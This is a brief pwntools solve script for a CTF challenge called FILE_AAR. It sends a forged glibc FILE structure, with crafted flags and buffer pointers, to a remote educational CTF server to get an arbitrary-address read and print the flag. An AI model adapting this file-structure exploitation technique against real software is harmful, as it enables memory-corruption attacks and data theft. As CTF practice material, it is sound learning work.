# FILE_AAR/solve.py
from pwn import *

context.arch = 'amd64'
#context.terminal = ['tmux', 'splitw', '-h']
#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10010)

flags = 0
NO_WRITES = 0x8
MAGIC = 0xfbad0000
CURRENTLY_PUTTING = 0x0800
flags &= ~NO_WRITES
flags |= (MAGIC | CURRENTLY_PUTTING)
# print(hex(flags)) # 0xfbad0800

payload = flat(
    0, 0,
    0, 0x1e1,
    flags, 0,
    0x404050, 0,
    0x404050, 0x404060,
    0, 0,
    0, 0,
    0, 0,
    0, 0x7ffff7fbc5c0,
    0x1
)
#gdb.attach(r)
r.sendline(payload)
print(r.recvline().decode().strip())